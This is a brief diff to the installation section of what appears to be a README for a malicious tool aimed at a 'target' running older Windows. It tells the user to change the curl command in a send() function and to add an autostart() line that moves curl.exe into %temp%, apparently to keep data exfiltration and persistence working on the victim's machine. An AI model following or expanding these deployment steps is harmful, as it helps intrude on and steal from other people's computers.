@@ -6,7 +6,7 @@
 * Enjoy
 
 ## Instalation if ur target use windows older than 1706
-* Add in the function send() in string "cmd" add .exe after curl
+* Add in the function send() in string "cmd" .exe after "curl"
 * Add in the function autostart() 
 ``` 
 file << "move curl.exe %temp%\n";
